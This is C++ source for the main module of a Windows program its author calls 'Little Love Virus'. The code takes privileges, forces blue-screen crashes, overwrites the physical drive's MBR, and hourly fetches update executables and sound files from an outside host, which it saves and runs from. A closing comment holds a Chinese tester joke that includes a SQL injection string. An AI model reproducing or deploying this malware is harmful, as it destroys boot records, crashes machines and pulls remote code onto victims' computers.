/*
Little Love Virus
Yellow Eel special version
By wurenji,2022
main:main.cpp
The main virus.

command:
/c:必须的参数
/r:正常运行
/b:直接蓝屏
/m:改MBR
/e:直接退出
/-b：禁用蓝屏
/-s：禁用声音
*/

#define __BUILD__ 1

#include"std.h"
#include"func.h"
#include"hide.h"

//自建中止函数
void terminate_func()
{
	MakeBlueScreen(0xccccc513);
}

int _tmain(int argc, TCHAR* c_argv[])
{
	set_terminate(terminate_func);
	set_unexpected(terminate_func);

	__time64_t now = 0;
	std::wstringstream wss;
	std::wfstream wfs;
	std::wstring arg;
	std::vector<std::wstring> argv(c_argv + 1, c_argv + argc - 1);
	bool
		cmd_c = false,
		cmd_r = false,
		cmd_b = false,
		cmd_m = false,
		cmd_e = false,
		cmd__b = false,
		cmd__s = false;


	//读取argv
	cmd_c = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/c"))) != argv.end();
	cmd_r = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/r"))) != argv.end();
	cmd_b = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/b"))) != argv.end();
	cmd_m = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/m"))) != argv.end();
	cmd_e = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/e"))) != argv.end();
	cmd__b = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-b"))) != argv.end();
	cmd__s = std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-s"))) != argv.end();

	if (!cmd_c)
		return 1;//不是内部调用

	GetPrivileges();

	if (cmd_b)
		MakeBlueScreen(0xcccccccc);
	if (cmd_m)
	{
		char mbrmsg_s[512];
		WideCharToMultiByte(CP_ACP, 0, (*(std::find(argv.begin(), argv.end(), static_cast<std::wstring>(_T("/-b"))) + 1)).c_str(), -1, mbrmsg_s, 512, NULL, NULL);
		WritePhydriveMBR(0, mbrmsg_s);
	}
	if (cmd_e)
		return 0;

	while (cmd_r)
	{
		now=_time64(NULL);
		srand(static_cast<unsigned int>(now));
		bool iserror = false, t_isok = false;
		wss << GetDataFromURL(_T("https://llv-website.rf.gd/update/lastbuild.txt"), t_isok);
		iserror = !t_isok || iserror;
		int lastbuildnumber = 0;
		wss >> lastbuildnumber;
		if (lastbuildnumber > __BUILD__)
		{
			//download update
			std::wstring newbuildname;
			wss << lastbuildnumber << _T(".exe") << std::flush;
			wss >> newbuildname;
			iserror = DownloadFileFromURL(_T("https://llv-website.rf.gd/update/lastbuild.exe"), _T("%ProgramData%\\llv\\") + newbuildname) || iserror;
			wfs.open(_T("%ProgramData%\\llv\\launcherobj.ini"), std::ios::out);
			wfs << lastbuildnumber;
			wfs.close();
			if (!wfs.good())
				iserror = true;
		}
		//抽奖
		if (rand() % 16 == 0 && !cmd__b)
			iserror = MakeBlueScreen(0xCC232323) || iserror;
		if (rand() % 16 == 0&&!cmd__s)
		{
			std::wstring soundid;
			wss << rand() % 5 << std::flush;
			wss >> soundid;
			std::wstring sounddata;
			sounddata = GetDataFromURL(_T("https://llv-website.rf.gd/res/sound") + soundid + _T(".wav"), t_isok);
			iserror = PlaySoundFile(_T("%ProgramData%\\llv\\cache\\sound") + soundid + _T(".wav"), true) || iserror || !t_isok;
		}
		if (iserror)
			terminate();
		Sleep(60 * 60 * 1000);//wait 1h
	}
	return 0;
}


/*
《酒吧》

wurenji

一个wurenji走进一家酒吧，要了一杯啤酒

一个wurenji走进一家酒吧，要了一杯啤酒·

一个wurenji走进一家酒吧，要了一杯咖啡

一个wurenji走进一家酒吧，要了0.7杯啤酒

一个wurenji走进一家酒吧，要了-1杯啤酒

一个wurenji走进一家酒吧，要了2^64杯啤酒

一个wurenji走进一家酒吧，要了一杯梅素汁

一个wurenji走进一家酒吧，要了一杯公鸡

一个wurenji走进一家酒吧，要了一份""

一个wurenji走进一家酒吧，什么也没要

一个wurenji走进一家酒吧，又走出去又从窗户进来又从后门出去从下水道钻进来

一个wurenji走进一家酒吧，又走出去又进来又出去又进来又出去，最后在外面把老板朵拉打了一顿

一个wurenji走进一//家酒吧，要了一杯啤酒

一个wurenji走进一家酒吧，要了一杯烫烫烫的锟斤拷

一个wurenji走进一家酒吧，要了1/0杯NULL

一个wurenji冲进一家酒吧，要了500个啤酒梅素汁香精煎鱼蒸虾头

一个wurenji把酒吧拆了

一个wurenji化装成老板朵拉走进一家酒吧，要了500杯啤酒并且不付钱

4.29亿个wurenji在酒吧门外呼啸而过

一个wurenji走进一家酒吧，要了一杯啤酒';DROP TABLE 酒吧

wurenji满意地离开了酒吧。

然后一个黄鳝点了一份香翅捞饭，酒吧炸了。

黄鳝傻逼！！！
*/